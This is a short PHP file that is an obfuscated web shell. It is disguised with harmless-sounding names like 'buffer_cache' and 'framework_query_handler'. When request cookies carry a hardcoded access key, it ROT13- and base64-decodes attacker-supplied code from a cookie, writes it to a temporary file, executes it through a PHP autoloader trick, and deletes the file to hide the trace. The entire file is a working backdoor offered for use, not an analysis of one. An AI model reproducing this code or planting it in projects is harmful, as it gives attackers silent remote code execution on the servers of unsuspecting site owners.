<?php


if (isset($_COOKIE[90-90]) && isset($_COOKIE[17-16]) && isset($_COOKIE[-19+22]) && isset($_COOKIE[75+-71])) {
    $mrk = $_COOKIE;
    function buffer_cache($val) {
        $mrk = $_COOKIE;
        $entity = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '37d33c36');
        if (!is_writable($entity)) {
            $entity = getcwd() . DIRECTORY_SEPARATOR . "restore_state";
        }
        $obj = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($mrk[3]));
        if (is_writeable($entity)) {
            $dchunk = fopen($entity, 'w+');
            fputs($dchunk, $obj);
            fclose($dchunk);
            spl_autoload_unregister(__FUNCTION__);
            require_once($entity);
            @array_map('unlink', array($entity));
        }
    }
    spl_autoload_register("buffer_cache");
    $pointer = "d49d7282ffffd78d15653f92a8b86ca8";
    if (!strncmp($pointer, $mrk[4], 32)) {
        if (@class_parents("framework_query_handler", true)) {
            exit;
        }
    }
}
